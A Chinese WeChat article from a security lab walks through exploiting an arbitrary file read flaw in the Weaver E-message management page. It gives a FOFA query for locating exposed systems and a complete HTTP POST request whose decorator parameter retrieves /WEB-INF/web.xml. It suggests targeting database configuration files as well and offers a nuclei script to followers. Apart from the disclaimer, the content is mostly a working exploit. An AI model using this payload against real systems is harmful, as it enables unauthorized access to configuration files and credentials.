#  泛微 E-message 任意文件读取

原创 blkx  [ 天澜实验室 ](javascript:void\(0\);)

**天澜实验室** ![]()

微信号 gh_c5fea27198a7

功能介绍 观水有术，必观其澜！
专注于感知国内外常见系统的漏洞态势，对漏洞进行分析、复现、武器化形成。涵盖漏洞复现、攻防演练、应急响应、工具开发等知识内容。秉承“没有网络安全就没有国家安全”的宗旨，热衷并服务于网络安全事业。

____

___发表于_

收录于合集 #漏洞复现 18个

![]()

**请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习交流使用，如若非法他用，与平台和本文作者无关，需自行负责！**

 **00**

 **漏洞概述**

![]()

泛微 E-message 系统管理页面decorator参数存在任意文件读取漏洞。

 **01**

 **空间搜索语法**

![]()

fofa

title="emessage 管理界面"

![]()

 **02**

 **利用过程**

![]()

登录界面

![]()

decorator参数存在任意文件读取漏洞，可下载系统文件。

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST / HTTP/1.1Host: User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36Content-Length: 43Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: closeContent-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1  
    decorator=%2FWEB-INF%2Fweb.xml&confirm=true

漏洞存在响应包如下，当然也可更换路径为数据库配置文件等下载。  

![]()

 **03**

 **nuclei**

![]()

![]()

获取脚本关注本公众号后发送：泛微E-message1

  

✓

关注我们

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

